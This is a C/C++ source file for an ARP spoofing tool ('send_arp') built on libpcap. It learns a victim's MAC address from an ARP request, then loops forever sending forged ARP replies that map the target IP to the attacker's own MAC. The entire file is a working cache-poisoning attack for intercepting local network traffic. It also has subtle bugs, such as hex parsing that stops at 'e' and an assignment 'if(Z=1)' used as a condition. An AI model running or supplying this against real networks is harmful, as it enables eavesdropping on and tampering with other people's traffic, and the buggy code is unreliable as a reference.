#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <errno.h>
static int Z = 0;
void type_check(const u_char *ty){
    if((ty[0]<<8|ty[1])==0x0800)
    {
        Z=1;
    }
    else
    {
        Z=2;
    }
}
static int MAC_SubFormatTransform(char * argv)
{
    char num1 =*(argv) ;
    char num2 =*(argv+1) ;
    int ret =0;

    if(num1 <='9') ret +=(num1-'0') *16 ;
    else if(num1 <='e') ret +=(num1-'a' +10) *16 ;
    else if(num1 <='E') ret +=(num1-'A' +10) *16 ;

    if(num2 <='9') ret +=(num2-'0') ;
    else if(num2 <='e') ret +=(num2-'a' +10) ;
    else if(num2 <='E') ret +=(num2-'A' +10) ;

    return ret ;
}

typedef struct ARP_header
{
    uint16_t Hardware;
    uint16_t Protocol;
    uint8_t HardwareAddresslen;
    uint8_t Protocoladdresslen;
    uint16_t Operation;
    uint8_t Sourcehardwareaddress[6];
    uint8_t Sourceprotocoladdress[4];
    uint8_t Targethardwareaddress[6];
    uint8_t Targetprotocoladdress[4];
}arp;
int getInterfaceInfo(char * iface ,unsigned char *local_IP ,unsigned char *local_MAC )
{
    char tMAC[18]="";
    char ifPath[256]="/sys/class/net/";
        strcat(ifPath ,(char*)iface);
        strcat(ifPath ,"/address");

    FILE *if_f =fopen(ifPath , "r");
    if(if_f == NULL)
        return 0 ;
    else
    {
        fread(tMAC ,1 ,17 ,if_f);		//read MAC from /sys/class/net/iface/address
        fclose(if_f) ;
        for(int i=0 ; i<6 ;i++)		// confirm data to  local_MAC
            {
                *(local_MAC+i) = MAC_SubFormatTransform(&tMAC[i*3]) ;
            }
    }
    // Get IP address
    // using ioctrl to get local IP ,
    // it may not bt an best way to achive that , i still search another way
    int fd;
    struct ifreq ifr;
    in_addr tIP ;

    fd = socket(AF_INET, SOCK_DGRAM, 0);	//using ioctl get IP address
    ifr.ifr_addr.sa_family = AF_INET;
    strcpy(ifr.ifr_name , (char*)iface);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    tIP =((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
    memcpy((char*)local_IP , &tIP ,sizeof(in_addr));

    return 1;
}
using namespace std;

void usage(){
    printf("syntax: send_arp <interface> <sender ip> <target ip>" );
}

int main(int argc, char* argv[]){

    if(argc != 4){
        usage();
            return -1;
    }
    int i =0;
    char * NetInterface = argv[1];
    char *textbox[4];
    int numbox[4];
    unsigned char host_IP[4] 	={0};	// localhost IP
    unsigned char host_MAC[6] 	={0};	// TargetMAC , this value will lookup ARP table
    unsigned char Spoofing_MAC[6] 	={0};	// spoofing MAC
    ether_header eth;
    printf("%s\n",argv[2]);
    char * ptr = strtok(argv[2],".");
    while(ptr != NULL)
    {
        textbox[i]=ptr;
        i++;
        ptr = strtok(NULL,".");
    }
    for (int i =0; i<4 ; i++)
    {
        if(textbox[i] != NULL)
            printf("%s\n",textbox[i]);
    }
    numbox[0] = strtol(textbox[0],NULL,10);
    numbox[1] = strtol(textbox[1],NULL,10);
    numbox[2] = strtol(textbox[2],NULL,10);
    numbox[3] = strtol(textbox[3],NULL,10);
    uint8_t repacket[60];
    memset(repacket,0,sizeof(repacket));
    //get sender mac
    getInterfaceInfo(NetInterface,host_IP,host_MAC);
    eth.ether_dhost[0] = 0xFF;
    eth.ether_dhost[1] = 0xFF;
    eth.ether_dhost[2] = 0xFF;
    eth.ether_dhost[3] = 0xFF;
    eth.ether_dhost[4] = 0xFF;
    eth.ether_dhost[5] = 0xFF;
    eth.ether_shost[0] = host_MAC[0];
    eth.ether_shost[1] = host_MAC[1];
    eth.ether_shost[2] = host_MAC[2];
    eth.ether_shost[3] = host_MAC[3];
    eth.ether_shost[4] = host_MAC[4];
    eth.ether_shost[5] = host_MAC[5];
    eth.ether_type = htons(0x0806);
    repacket[0] = 0xFF;
    repacket[1] = 0xFF;
    repacket[2] = 0xFF;
    repacket[3] = 0xFF;
    repacket[4] = 0xFF;
    repacket[5] = 0xFF;
    repacket[6] = host_MAC[0];
    repacket[7] = host_MAC[1];
    repacket[8] = host_MAC[2];
    repacket[9] = host_MAC[3];
    repacket[10] = host_MAC[4];
    repacket[11] = host_MAC[5];
    repacket[12] = 0x08;
    repacket[13] = 0x06;
    repacket[14] = 0x00;
    repacket[15] = 0x01;
    repacket[16] = 0x08;
    repacket[17] = 0x00;
    repacket[18] = 0x06;
    repacket[19] = 0x04;
    repacket[20] = 0x00;
    repacket[21] = 0x01;
    repacket[22] = host_MAC[0];
    repacket[23] = host_MAC[1];
    repacket[24] = host_MAC[2];
    repacket[25] = host_MAC[3];
    repacket[26] = host_MAC[4];
    repacket[27] = host_MAC[5];
    repacket[28] = host_IP[0];
    repacket[29] = host_IP[1];
    repacket[30] = host_IP[2];
    repacket[31] = host_IP[3];
    repacket[32] = 0x00;
    repacket[33] = 0x00;
    repacket[34] = 0x00;
    repacket[35] = 0x00;
    repacket[36] = 0x00;
    repacket[37] = 0x00;
    repacket[38] = numbox[0];
    repacket[39] = numbox[1];
    repacket[40] = numbox[2];
    repacket[41] = numbox[3];

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ, 1,1000,errbuf);
    if(handle==NULL){
        fprintf(stderr, "couldn't open device %s: %s\n",dev,errbuf);
        return -1;
    }

    if(pcap_sendpacket(handle,repacket,60)!=0){
        fprintf(stderr," \nError\n",pcap_geterr(handle));
        return -1;
    }
    if(pcap_sendpacket(handle,repacket,60)!=0){
        fprintf(stderr," \nError\n",pcap_geterr(handle));
        return -1;
    }
    while(1){
        if(pcap_sendpacket(handle,repacket,60)!=0){
            fprintf(stderr," \nError\n",pcap_geterr(handle));
            return -1;
        }

        struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
            type_check(&packet[16]);
            if(Z=1){
                if(packet[12]==0x08&&packet[13]==0x06){
                    if((packet[28] == repacket[38])&&(packet[29] == repacket[39])&&(packet[30] == repacket[40])&&(packet[31] == repacket[41])){
                            Spoofing_MAC[0] = packet[22];
                            Spoofing_MAC[1] = packet[23];
                            Spoofing_MAC[2] = packet[24];
                            Spoofing_MAC[3] = packet[25];
                            Spoofing_MAC[4] = packet[26];
                            Spoofing_MAC[5] = packet[27];

                            break;
                    }

                          else{continue;}
                     }
                else{
                    continue;
                }

                }


            else{
                continue;
            }

    }
    printf("%.2x",Spoofing_MAC[0]);
    printf("%.2x",Spoofing_MAC[1]);
    printf("%.2x",Spoofing_MAC[2]);
    printf("%.2x",Spoofing_MAC[3]);
    printf("%.2x",Spoofing_MAC[4]);
    printf("%.2x\n",Spoofing_MAC[5]);
//get target Mac address
uint8_t spoofpacket[60];
memset(spoofpacket,0,sizeof(spoofpacket));

spoofpacket[0]= Spoofing_MAC[0];
spoofpacket[1]= Spoofing_MAC[1];
spoofpacket[2]= Spoofing_MAC[2];
spoofpacket[3]= Spoofing_MAC[3];
spoofpacket[4]= Spoofing_MAC[4];
spoofpacket[5]= Spoofing_MAC[5];
spoofpacket[6] = repacket[22];
spoofpacket[7] =repacket[23];
spoofpacket[8] =repacket[24];
spoofpacket[9] =repacket[25];
spoofpacket[10] =repacket[26];
spoofpacket[11] =repacket[27];
spoofpacket[12] = 0x08;
spoofpacket[13] = 0x06;
spoofpacket[14] = 0x00;
spoofpacket[15] = 0x01;
spoofpacket[16] = 0x08;
spoofpacket[17] = 0x00;
spoofpacket[18] = 0x06;
spoofpacket[19] = 0x04;
spoofpacket[20] = 0x00;
spoofpacket[21] = 0x02;
spoofpacket[22] = repacket[22];
spoofpacket[23] =repacket[23];
spoofpacket[24] =repacket[24];
spoofpacket[25] =repacket[25];
spoofpacket[26] =repacket[26];
spoofpacket[27] =repacket[27];
printf("%s\n",argv[3]);
int pp=0;
char * ptr1 = strtok(argv[3],".");
while(ptr1 != NULL)
{
    textbox[pp]=ptr1;
    pp++;
    ptr1 = strtok(NULL,".");
}
numbox[0] = strtol(textbox[0],NULL,10);
numbox[1] = strtol(textbox[1],NULL,10);
numbox[2] = strtol(textbox[2],NULL,10);
numbox[3] = strtol(textbox[3],NULL,10);
spoofpacket[28] = numbox[0];
spoofpacket[29] = numbox[1];
spoofpacket[30] = numbox[2];
spoofpacket[31] = numbox[3];
spoofpacket[32] = Spoofing_MAC[0];
spoofpacket[33] = Spoofing_MAC[1];
spoofpacket[34] = Spoofing_MAC[2];
spoofpacket[35] = Spoofing_MAC[3];
spoofpacket[36] = Spoofing_MAC[4];
spoofpacket[37] = Spoofing_MAC[5];
spoofpacket[38] = repacket[38];
spoofpacket[39] = repacket[39];
spoofpacket[40] = repacket[40];
spoofpacket[41] = repacket[41];

while(1){
    sleep(100);
    printf("ARP SPoofing\n");
if(pcap_sendpacket(handle,spoofpacket,60)!=0){
    fprintf(stderr," \nError\n",pcap_geterr(handle));
    return -1;
}
}



pcap_close(handle);




}
